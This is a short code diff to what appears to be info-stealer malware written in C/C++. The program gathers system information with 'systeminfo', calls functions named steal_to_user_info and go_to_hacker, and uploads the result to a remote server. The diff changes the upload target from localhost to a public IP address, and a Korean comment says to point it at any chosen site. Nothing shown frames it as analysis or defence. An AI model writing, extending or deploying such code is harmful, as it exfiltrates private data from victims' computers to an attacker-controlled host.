@@ -63,8 +63,10 @@ const wchar_t* commands[Command_Count] = {
     L"echo 0",
     L"systeminfo > user_info.txt",
     L"echo.",
-    L"cls"
+    L"cls",
+    L"mkdir C:\\test_down"
 };
+
 
 wchar_t host_name[500];
 wchar_t os_name[500];
@@ -179,7 +181,7 @@ int main() {
     steal_to_user_info();
 
     go_to_hacker();
-    upload_file("result.txt", "http://127.0.0.1:5000");  // 원하는 사이트의 업로드 URL로 변경
+    upload_file("result.txt", "http://222.110.248.152:5000/");  // 원하는 사이트의 업로드 URL로 변경
 
     delete_temp_files();
     
